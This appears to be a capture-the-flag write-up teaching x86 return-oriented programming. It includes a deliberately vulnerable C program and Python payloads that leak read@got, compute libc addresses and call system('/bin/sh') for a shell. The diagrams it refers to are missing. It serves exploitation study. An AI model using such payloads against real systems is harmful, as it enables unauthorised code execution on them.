# ROP in x86 architecture

In x86 architecture, **function arguments are passed on the stack, below the return address** as shown in the diagram:

Therefore, when crafting a ROP chain, we must place function arguments directly onto the stack, just after the return address.
To do this, we need gadgets such as `pop; pop; pop; ret;` that allows us to subtract esp to the point of the start of the stack frame.

Considering these facts, let's do challenge.

## Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

## Step 1: Leak read@got using ROP

The buffer overflow vulnerability comes from the range of `read` function call. We can use this to leak the address of read@got with using a ROP chain with `write`.

Stack layout for the first ROP chain:

So we can construct payload as:
```python
payload = b"A" * 0x48
payload += p32(write_plt) # e.plt['write']
payload += p32(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main) # e.symbols['main']
```

`pop3_ret: 0x8048689`
( We can get gadget using `ROPgadget`)

## Step 2: Calculate Address from Leaked read@got

Since we decided to return to main, we have to send another payload executing `system("/bin/sh")`.
Once read@got is leaked, we can compute the libc base address, and then determine `system` and `/bin/sh` locations.

```python
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
sh_offset = list(libc.search(b"/bin/sh"))[0]
sh = libc_base + sh_offset
```

## Step 3: Build Final Exploit
Using the calculated addresses, we craft a second payload to call `system("/bin/sh")`:

```python
payload = b"A" * 0x48
payload += p32(system)
payload += p32(pop_ret)
payload += p32(sh)
```
